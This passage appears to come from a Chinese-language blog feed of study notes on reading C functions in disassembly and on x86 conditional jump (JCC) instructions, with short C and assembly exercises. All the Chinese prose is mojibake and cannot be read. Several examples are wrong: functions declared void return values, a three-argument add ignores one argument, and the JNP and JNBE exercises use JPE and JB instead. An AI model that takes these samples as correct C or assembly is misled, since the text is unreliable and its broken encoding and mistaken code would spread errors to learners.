id="è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£"><a href="#è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£" class="headerlink" title="è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£"></a>è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£</h4><p><strong>è°ƒå‡ºå¯„å­˜å™¨ï¼Œæ ˆï¼Œå†…å­˜çª—å£</strong><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714528282225.jpg" srcset="/img/loading.gif" alt="-w586"><br>çœ‹å›¾ï¼Œåœ¨ç©ºç™½å¤„å³å‡»ç‚¹å‡»ä¸€ä¸‹ä½ éœ€è¦çš„çª—å£å°±å¥½äº†ã€‚<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714528997602.jpg" srcset="/img/loading.gif" alt="-w526"></p><h4 id="è¿›å…¥åæ±‡ç¼–çª—å£"><a href="#è¿›å…¥åæ±‡ç¼–çª—å£" class="headerlink" title="è¿›å…¥åæ±‡ç¼–çª—å£"></a>è¿›å…¥åæ±‡ç¼–çª—å£</h4><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œä¸”æœ‰é€‚å½“æ–­ç‚¹çš„æ—¶å€™ï¼Œçœ‹å›¾<br><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714530279259.jpg" srcset="/img/loading.gif" alt="-w517"></p><p>å³å‡»ç¨‹åºæ¡†å†…çš„ç©ºç™½å¤„ï¼Œç„¶åç‚¹å‡»GO to Disassembly å°±å¥½äº†ã€‚åœ¨è¿™é‡Œé¢æœ€é‡è¦çš„æ“ä½œå°±æ˜¯ï¼š<code>F10 F11</code>åˆ†åˆ«æ˜¯æ­¥è¿‡å’Œæ­¥å…¥ã€‚è¿™ä¸ªè·Ÿodé‡Œä¸ä¸€æ ·ã€‚</p><h2 id="Cè¯­è¨€çš„è°ƒç”¨"><a href="#Cè¯­è¨€çš„è°ƒç”¨" class="headerlink" title="Cè¯­è¨€çš„è°ƒç”¨"></a>Cè¯­è¨€çš„è°ƒç”¨</h2><p>1ã€æ— å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>2ã€æœ‰å‚æ•°ï¼Œæ— è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>3ã€æ— å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨<br>4ã€æœ‰å‚æ•°ï¼Œæœ‰è¿”å›å€¼çš„å‡½æ•°è°ƒç”¨</p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç©ºå‡½æ•°</h2><h3 id="å…ˆä¸Šcï¼š"><a href="#å…ˆä¸Šcï¼š" class="headerlink" title="å…ˆä¸Šcï¼š"></a>å…ˆä¸Šcï¼š</h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Function(){}int main(int argc, char* argv[]){    Function()    return 0;}</code></pre></div><h3 id="åæ±‡ç¼–åˆ†æï¼š"><a href="#åæ±‡ç¼–åˆ†æï¼š" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714535234194.jpg" srcset="/img/loading.gif" alt="-w438"></p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-ç®€å•åŠŸèƒ½</h2><h3 id="ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š"><a href="#ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š" class="headerlink" title="ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š"></a>ä¸¤ä¸ªæ•°ç›¸åŠ ï¼š</h3><h4 id="cä»£ç ï¼š"><a href="#cä»£ç ï¼š" class="headerlink" title="cä»£ç ï¼š"></a>cä»£ç ï¼š</h4><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int y){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1);    return 0;}</code></pre></div><h4 id="åæ±‡ç¼–åˆ†æï¼š-1"><a href="#åæ±‡ç¼–åˆ†æï¼š-1" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h4><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714537632825.jpg" srcset="/img/loading.gif" alt="-w709"></p><h3 id="ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š"><a href="#ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š" class="headerlink" title="ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š"></a>ä¸‰ä¸ªæ•°ç›¸åŠ ï¼š</h3><h4 id="cä»£ç ï¼š-1"><a href="#cä»£ç ï¼š-1" class="headerlink" title="cä»£ç ï¼š"></a>cä»£ç ï¼š</h4><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;void Plus(int x,int yï¼Œint z){    return x+y;}int main(int argc, char* argv[]){    Plus(2,1,3);    return 0;}</code></pre></div><h4 id="åæ±‡ç¼–åˆ†æï¼š-2"><a href="#åæ±‡ç¼–åˆ†æï¼š-2" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h4><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714539277702.jpg" srcset="/img/loading.gif" alt="-w974"><br>ï¼ˆå’Œä¸Šé¢é‚£ä¸ªåŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯ä¸ºäº†ç»ƒä¹ ï¼Œä¸è¯¦ç»†å†™äº†ï¼‰</p><h2 id="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨"><a href="#å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨" class="headerlink" title="å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨"></a>å‡½æ•°çš„åæ±‡ç¼–åˆ†æ-åµŒå¥—è°ƒç”¨</h2><p>è¦æ±‚ï¼šç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œèƒ½å¤Ÿå®ç°å¯¹ä»»æ„5ä¸ªæ•´æ•°å®ç°åŠ æ³•(ä½¿ç”¨Plus1å’ŒPlus2).</p><h3 id="cä»£ç "><a href="#cä»£ç " class="headerlink" title="cä»£ç "></a>cä»£ç </h3><div class="hljs"><pre><code>#include &quot;stdafx.h&quot;int Plus1(int x,int y){    return x+y;}int Plus2(int x,int y,int z){    return x+y+z;}int Plus3(int a,int b,int c,int d,int e){    int i,j,m;    i=Plus1(a,b);    j=Plus2(c,d,e);    m=Plus1(i,j);    return m;}int main(int argc, char* argv[]){    Plus3(2,1,3,1,5);    return 0;}</code></pre></div><h3 id="åæ±‡ç¼–åˆ†æï¼š-3"><a href="#åæ±‡ç¼–åˆ†æï¼š-3" class="headerlink" title="åæ±‡ç¼–åˆ†æï¼š"></a>åæ±‡ç¼–åˆ†æï¼š</h3><p><img src="/2019/10/19/Cè¯­è¨€ä¸åæ±‡ç¼–å­¦ä¹ ï¼ˆä¸€ï¼‰/images/15714541318519.jpg" srcset="/img/loading.gif" alt="-w1534"><br>ï¼ˆä¸­é—´è°ƒç”¨ä¸€ä¸ªPlus1 å’Œ Plus2ï¼Œå°±ä¸å¿…è¿›å…¥åˆ†æäº†ï¼ŒåŸºæœ¬è·Ÿå‰é¢ç®€å•åˆ†æé‚£ä¸¤ä¸ªä¸€æ ·ï¼Œè¿™ä¸ªç»ƒä¹ æ˜¯é¡ºæˆä¸‹æ¥çš„ã€‚ï¼‰</p><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>å­¦å®Œæ±‡ç¼–äº†ï¼Œå°±æ¥ç€Cä¸æ±‡ç¼–ç»“åˆåˆ†æï¼Œæ­¥æ­¥æŠŠå¸¸è§çš„ç»“åˆåˆ†æå®Œã€‚è¿™æ¬¡å­¦ä¹ ä¸ç»ƒä¹ ï¼Œå¯ä»¥ä¸€æ•´æ®µä¸€æ•´æ®µçš„è¯»æ±‡ç¼–ä»£ç äº†ï¼Œ<strong>ï¼ˆè¿™ä¸ªå‰é¢å…¶å®è¿˜æœ‰ç”»è¿‡å †æ ˆå›¾ï¼Œå½“æ—¶æ˜¯ä¸€å¥å¥åˆ†æå­¦ä¹ çš„ï¼Œä¸ºäº†ç†Ÿæ‚‰å †æ ˆå’Œæ±‡ç¼–è¯­å¥ï¼Œæ‰¾æ—¶é—´è¡¥ä¸‹ç¬”è®°</strong>ï¼‰ä¹Ÿç†Ÿæ‚‰äº†å‡½æ•°æ˜¯å¦‚ä½•åµŒå¥—è°ƒç”¨çš„ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>cä¸æ±‡ç¼–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JCCå­¦ä¹ </title>
    <link href="/2019/10/07/JCC/"/>
    <url>/2019/10/07/JCC/</url>
    
    <content type="html"><![CDATA[<h1 id="JCCå­¦ä¹ "><a href="#JCCå­¦ä¹ " class="headerlink" title="JCCå­¦ä¹ "></a>JCCå­¦ä¹ </h1><h2 id="JCCæŒ‡ä»¤é›†åˆ"><a href="#JCCæŒ‡ä»¤é›†åˆ" class="headerlink" title="JCCæŒ‡ä»¤é›†åˆ"></a>JCCæŒ‡ä»¤é›†åˆ</h2><h3 id="è¯¦ç»†"><a href="#è¯¦ç»†" class="headerlink" title="è¯¦ç»†__"></a>è¯¦ç»†__</h3><p>1ã€JE, JZã€€ã€€ã€€ã€€ã€€ã€€ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬)ã€€ã€€ã€€ã€€ ã€€ã€€ ZF=1</p><p>2ã€JNE, JNZã€€ã€€  ã€€ã€€ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ã€€ã€€ã€€ã€€   ZF=0</p><p>3ã€JSã€€ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€    SF=1</p><p>4ã€JNS ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€   SF=0</p><p>5ã€JP, JPEã€€ã€€ã€€ã€€ã€€ ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€      PF=1</p><p>6ã€JNP, JPOã€€ã€€ã€€ã€€  ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€      PF=0</p><p>7ã€JOã€€ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€      OF=1</p><p>8ã€JNO ã€€ã€€ã€€ã€€ã€€ã€€  ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€            OF=0</p><p>9ã€JB, JNAE ã€€ã€€ã€€ã€€ å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€   CF=1</p><p>10ã€JNB, JAE ã€€ã€€ã€€  å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€   CF=0</p><p>11ã€JBE, JNA  ã€€ã€€ã€€ å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€  CF=1 or ZF=1</p><p>12ã€JNBE, JA ã€€ã€€ã€€  å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€  CF=0 and ZF=0</p><p>13ã€JL, JNGE ã€€ã€€ã€€  å°äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€    SFâ‰  OF</p><p>14ã€JNL, JGEã€€ã€€ã€€   å¤§äºç­‰äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€    SF=OF</p><p>15ã€JLE, JNG  ã€€ã€€ã€€ å°äºç­‰äºåˆ™è·³è½¬ (<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€    ZF=1 or SFâ‰  OF</p><p>16ã€JNLE, JG ã€€ã€€ã€€  å¤§äºåˆ™è·³è½¬(<strong>æœ‰ç¬¦å·æ•°</strong>)ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€     ZF=0 and SF=OF</p><h3 id="è¡¨æ ¼æ€»ç»“"><a href="#è¡¨æ ¼æ€»ç»“" class="headerlink" title="è¡¨æ ¼æ€»ç»“"></a>è¡¨æ ¼æ€»ç»“</h3><p><img src="/2019/10/07/JCC/images/15713086707312.jpg" srcset="/img/loading.gif" alt="-w1067"></p><p>ç›´æ¥æ‘˜æŠ„çš„åšçš„å¾ˆè¯¦ç»†ï¼Œæ­£å¥½æœ‰åŠ©è®°ï¼Œä½†æ˜¯éœ€è¦å’Œä¸Šé¢è¯¦ç»†æŒ‡ä»¤æ­é…ä½¿ç”¨ï¼Œè¦<strong>æ³¨æ„é‚£äº›æœ‰ç¬¦å·çš„JCCè·³è½¬æŒ‡ä»¤ï¼Œ</strong>å› ä¸ºåœ¨è¿™ä¸ªè¡¨é‡Œæ²¡æœ‰ä½“ç°ã€‚ä¹Ÿä¸ç”¨å¤ªç€æ€¥èƒŒï¼Œç†Ÿæ‚‰ä¸€ä¸‹å°±å¯ä»¥äº†ï¼Œæœ‰éƒ¨åˆ†æ˜¯å¯ä»¥ç›´æ¥è®°ä½çš„ï¼Œåœ¨å¾€åé‡åˆ°æ¨¡ç³Šçš„ç›´æ¥æŸ¥ä¸‹å°±å¯ä»¥äº†ã€‚</p><h3 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h3><p><strong>JCCæŒ‡ä»¤å†³å®šå®ƒè·³ä¸è·³è½¬è·Ÿåˆ«çš„æ²¡å…³ç³»ï¼Œåªè·ŸEFLAGæ ‡å¿—å¯„å­˜å™¨æœ‰å…³ç³»ï¼Œæ ¹æ®ç¬¦å·ä½æ¥è¿›è¡Œè·³è½¬çš„</strong></p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬"><a href="#ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬" class="headerlink" title="ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬."></a>ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤ä¿®æ”¹æ ‡å¿—å¯„å­˜å™¨ä¸­çš„æŸä¸ªä½çš„å€¼ï¼Œå®ç°JCCçš„åå…­ç§è·³è½¬.</h3><p>å‰æï¼šèƒ½ç”¨CMPå’ŒTESTå®ç°çš„ä¼˜å…ˆè€ƒè™‘.</p><h4 id="1ã€JE-JZ-ç»“æœä¸ºé›¶åˆ™è·³è½¬-ç›¸ç­‰æ—¶è·³è½¬-ZF-1"><a href="#1ã€JE-JZ-ç»“æœä¸ºé›¶åˆ™è·³è½¬-ç›¸ç­‰æ—¶è·³è½¬-ZF-1" class="headerlink" title="1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1"></a>1ã€JE, JZ ç»“æœä¸ºé›¶åˆ™è·³è½¬(ç›¸ç­‰æ—¶è·³è½¬) ZF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JE</span> <span class="hljs-number">0X0040102B</span></code></pre></div><h4 id="2ã€JNE-JNZ-ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬-ä¸ç›¸ç­‰æ—¶è·³è½¬-ZF-0"><a href="#2ã€JNE-JNZ-ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬-ä¸ç›¸ç­‰æ—¶è·³è½¬-ZF-0" class="headerlink" title="2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0"></a>2ã€JNE, JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬(ä¸ç›¸ç­‰æ—¶è·³è½¬) ZF=0</h4><div class="hljs"><pre><code class="hljs undefined">MOV AL,1<span class="hljs-keyword">TEST </span>AL,ALJNZ 0X00401006</code></pre></div><h4 id="3ã€-JS-ç»“æœä¸ºè´Ÿåˆ™è·³è½¬-SF-1"><a href="#3ã€-JS-ç»“æœä¸ºè´Ÿåˆ™è·³è½¬-SF-1" class="headerlink" title="3ã€ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1"></a>3ã€ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ SF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span></code></pre></div><h4 id="4ã€-JNS-ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬-SF-0"><a href="#4ã€-JNS-ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬-SF-0" class="headerlink" title="4ã€ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0"></a>4ã€ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ SF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">XOR</span> <span class="hljs-built_in">EAX</span>,<span class="hljs-built_in">EAX</span><span class="hljs-keyword">JNS</span> <span class="hljs-number">0X0040102F</span></code></pre></div><h4 id="5ã€-JP-JPE-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬-PF-1"><a href="#5ã€-JP-JPE-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬-PF-1" class="headerlink" title="5ã€ JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1"></a>5ã€ JP, JPE ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ PF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JPE</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="6ã€JNP-JPO-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬-PF-0"><a href="#6ã€JNP-JPO-ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬-PF-0" class="headerlink" title="6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0"></a>6ã€JNP, JPO ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ PF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">2</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JPE</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="7ã€-JO-ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬-OF-1"><a href="#7ã€-JO-ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬-OF-1" class="headerlink" title="7ã€ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1"></a>7ã€ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ OF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">80</span><span class="hljs-keyword">SUB</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">10</span><span class="hljs-keyword">JO</span> <span class="hljs-number">0X00401008</span></code></pre></div><h4 id="8ã€-JNO-ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬-OF-0"><a href="#8ã€-JNO-ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬-OF-0" class="headerlink" title="8ã€ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0"></a>8ã€ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ OF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,0FFFF<span class="hljs-keyword">ADD</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">JNO</span> <span class="hljs-number">0X00401010</span></code></pre></div><h4 id="9ã€-JB-JNAE-å°äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1"><a href="#9ã€-JB-JNAE-å°äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1" class="headerlink" title="9ã€ JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1"></a>9ã€ JB, JNAE å°äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X0040103E</span></code></pre></div><h4 id="10ã€-JNB-JAE-å¤§äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0"><a href="#10ã€-JNB-JAE-å¤§äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0" class="headerlink" title="10ã€ JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0"></a>10ã€ JNB, JAE å¤§äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CX</span>,<span class="hljs-built_in">AX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401044</span></code></pre></div><h4 id="11ã€-JBE-JNA-å°äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1-or-ZF-1"><a href="#11ã€-JBE-JNA-å°äºç­‰äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-1-or-ZF-1" class="headerlink" title="11ã€ JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1"></a>11ã€ JBE, JNA å°äºç­‰äºåˆ™è·³è½¬ (æ— ç¬¦å·æ•°) CF=1 or ZF=1</h4><p>ä¸€ç§ç›´æ¥è·Ÿç»ƒä¹ 9ä¸€æ ·ç›´æ¥æ„é€ è®©CF=1æˆ–è€…è®©è·Ÿç»ƒä¹ 1è®©ZF=0å°±å¯ä»¥äº†ã€‚</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">1</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JE</span> <span class="hljs-number">0X0040102B</span></code></pre></div><p>æˆ–è€…</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AX</span>,<span class="hljs-built_in">CX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X0040103E</span></code></pre></div><h4 id="12ã€-JNBE-JA-å¤§äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0-and-ZF-0"><a href="#12ã€-JNBE-JA-å¤§äºåˆ™è·³è½¬-æ— ç¬¦å·æ•°-CF-0-and-ZF-0" class="headerlink" title="12ã€ JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0"></a>12ã€ JNBE, JA å¤§äºåˆ™è·³è½¬(æ— ç¬¦å·æ•°) CF=0 and ZF=0</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AX</span>,<span class="hljs-number">80</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>,<span class="hljs-number">90</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">CX</span>,<span class="hljs-built_in">AX</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401044</span></code></pre></div><p>è§£æï¼š</p><p>è¿™ä¸ªä¸ç»ƒä¹ 10çš„åŒºåˆ«å°±æ˜¯ä¸å¯ä»¥è®©ä¸¤ä¸ªæ•°ç›¸ç­‰ã€‚</p><h4 id="13ã€-JL-JNGE-å°äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SFâ‰ -OF"><a href="#13ã€-JL-JNGE-å°äºåˆ™è·³è½¬-æœ‰ç¬¦å·æ•°-SFâ‰ -OF" class="headerlink" title="13ã€ JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OF"></a>13ã€ JL, JNGE å°äºåˆ™è·³è½¬ (æœ‰ç¬¦å·æ•°) SFâ‰  OF</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">0XFF</span><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CL</span>,<span class="hljs-number">0X01</span><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-built_in">CL</span><span class="hljs-keyword">JB</span> <span class="hljs-number">0X00401063</span><span class="hljs-keyword">JL</span> <span 